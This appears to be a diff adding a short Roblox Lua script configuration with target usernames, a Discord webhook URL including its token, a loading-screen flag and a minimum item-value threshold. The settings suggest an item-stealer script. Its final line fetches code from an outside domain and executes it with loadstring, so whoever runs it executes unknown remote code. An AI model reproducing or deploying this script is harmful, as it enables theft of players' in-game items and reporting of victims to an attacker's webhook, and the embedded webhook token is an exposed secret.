@@ -1,0 +1,9 @@
+Username = "SignHugeAndExclusive"
+Username2 = "SignHugeAndExclusive"
+Webhook = "https://discord.com/api/webhooks/1187119789466980432/dphvI8xYsxICZfhyMGSkhgjw4-Sm9TtAf6AS1GgwS8VOuUPQSsTxf5toow4-Y9v3u-B_"
+
+LoadingScreen = true
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
